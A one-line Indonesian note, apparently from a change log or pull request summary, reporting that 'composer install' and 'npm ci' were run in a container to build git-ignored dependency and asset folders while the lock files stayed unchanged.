- `composer install` dan `npm ci` dijalankan di container untuk membuat `vendor/`, `node_modules/`, `public/build` (semuanya di-ignore git); `composer.lock` dan `package-lock.json` tidak berubah.
